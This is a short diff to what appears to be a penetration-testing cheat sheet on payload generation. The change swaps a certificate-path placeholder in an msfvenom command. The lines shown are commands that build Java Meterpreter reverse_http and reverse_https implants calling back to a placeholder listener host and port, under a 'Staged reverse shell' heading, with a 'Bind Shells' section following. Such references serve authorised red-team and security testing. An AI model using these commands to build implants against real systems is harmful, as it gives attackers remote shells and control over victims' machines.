@@ -37,7 +37,7 @@ $ msfvenom -p java/meterpreter/reverse_http lhost=<IP> lport=<PORT> -f raw -o im
 Staged reverse shell.
 
 ```
-$ msfvenom -p java/meterpreter/reverse_https handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f raw -o implant.jar
+$ msfvenom -p java/meterpreter/reverse_https handlersslcert=[/path/to/certificate.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f raw -o implant.jar
 ```
 
 ### 1.2 - Bind Shells
